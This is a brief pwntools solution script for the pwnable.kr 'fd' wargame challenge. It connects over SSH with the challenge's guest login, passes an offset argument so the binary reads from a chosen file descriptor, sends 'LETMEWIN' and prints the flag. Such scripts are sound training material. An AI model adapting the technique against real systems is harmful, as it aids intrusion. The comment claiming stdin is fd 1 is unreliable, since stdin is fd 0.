from pwn import *

session = ssh('fd', 'pwnable.kr', port=2222, password='guest')

# stdin is fd 1. Our arg is reduced by 0x1234, so let's send 0x1235.
arg1 = str(0x1235)
io = session.process(['./fd', arg1])
io.sendline('LETMEWIN')
io.recvuntil(':)\n')
print(io.recvline())
